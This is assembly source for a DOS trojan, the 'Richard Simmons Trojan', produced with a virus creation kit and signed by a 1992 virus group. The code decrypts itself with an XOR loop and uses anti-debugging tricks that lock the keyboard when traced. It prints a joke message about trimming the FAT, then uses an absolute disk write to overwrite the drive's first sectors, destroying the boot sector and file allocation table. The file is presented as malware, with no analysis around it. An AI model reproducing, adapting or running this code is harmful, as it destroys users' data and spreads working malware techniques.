; RICHARDS.ASM -- R. Simmons Trojan
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Nowhere Man

virus_type	equ	3			; Trojan Horse
is_encrypted	equ	1			; We're encrypted
tsr_virus	equ	0			; We're not TSR

code		segment byte public
		assume	cs:code,ds:code,es:code,ss:code
		org	0100h

start		label	near

main		proc	near
		call	encrypt_decrypt		; Decrypt the virus

start_of_code	label	near

stop_tracing:	mov	cx,09EBh
		mov	ax,0FE05h		; Acutal move, plus a HaLT
		jmp	$-2
		add	ah,03Bh			; AH now equals 025h
		jmp	$-10			; Execute the HaLT
		mov	bx,offset null_vector	; BX points to new routine
		push	cs			; Transfer CS into ES
		pop	es			; using a PUSH/POP
		int	021h
		mov	al,1			; Disable interrupt 1, too
		int	021h
		jmp	short skip_null		; Hop over the loop
null_vector:	jmp	$			; An infinite loop
skip_null:	mov	byte ptr [lock_keys + 1],130  ; Prefetch unchanged
lock_keys:	mov	al,128			; Change here screws DEBUG
		out	021h,al			; If tracing then lock keyboard

		mov	si,offset data00	; SI points to data
		mov	ah,0Eh			; BIOS display char. function
display_loop:   lodsb				; Load the next char. into AL
		or	al,al			; Is the character a null?
		je	disp_strnend		; If it is, exit
		int	010h			; BIOS video interrupt
		jmp	short display_loop	; Do the next character
disp_strnend:

		mov	ax,0002h		; First argument is 2
		mov	cx,0010h		; Second argument is 16
		cli				; Disable interrupts (no Ctrl-C)
		cwd				; Clear DX (start with sector 0)
		int	026h			; DOS absolute write interrupt
		sti				; Restore interrupts


		mov	ax,04C00h		; DOS terminate function
		int	021h
main		endp

data00		db      "C'mon now, trim that FAT!  1 and 2 and 3 and....",13,10,10,0

vcl_marker	db	"[VCL]",0		; VCL creation marker


note		db	"The Richard Simmons Trojan; gu"
		db	"aranteed to get rid of that un"
		db	"sightly FAT in no time!",0
		db	"[Richard Simmons Trojan]",0
		db	"Nowhere Man, [NuKE] '92",0

end_of_code	label	near

encrypt_decrypt	proc	near
		mov	si,offset start_of_code ; SI points to code to decrypt
		mov	cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:	xor	word ptr [si],06734h	; XOR a word by the key
		inc	si			; Do the next word
		inc	si			;
		loop	xor_loop		; Loop until we're through
		ret				; Return to caller
encrypt_decrypt	endp
finish		label	near

code		ends
		end	main